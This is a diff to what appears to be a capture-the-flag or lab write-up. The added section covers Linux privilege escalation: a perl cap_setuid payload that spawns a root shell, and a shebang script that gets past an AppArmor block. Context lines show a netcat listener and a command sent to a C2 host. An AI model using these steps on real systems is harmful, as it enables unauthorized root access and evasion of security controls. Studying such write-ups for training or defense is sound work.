@@ -120,3 +120,28 @@ kill "${pid}"
 { sleep 2; res=$( send_command "$C2" ); } &
 nc -lvnp $PORT
 ```
+
+## Privilege Escalation
+
+To get our root shell, we will use `pearl` as we have the `cap_setuid+ep` enabled. We also note that when we attempt this, we are denied a root shell:
+```bash
+$ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+$
+```
+
+We are being denied this by `apparmor`. Fortunately, there is an explot wherein if we start a script with a shebang (`#!`) then we can skip the checks for some reason...
+```bash
+$ cat /tmp/pe.pl
+
+#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+
+exec "/bin/sh"
+
+$ /tmp/pe.pl
+#
+```
+
+And thus, we have a root shell!
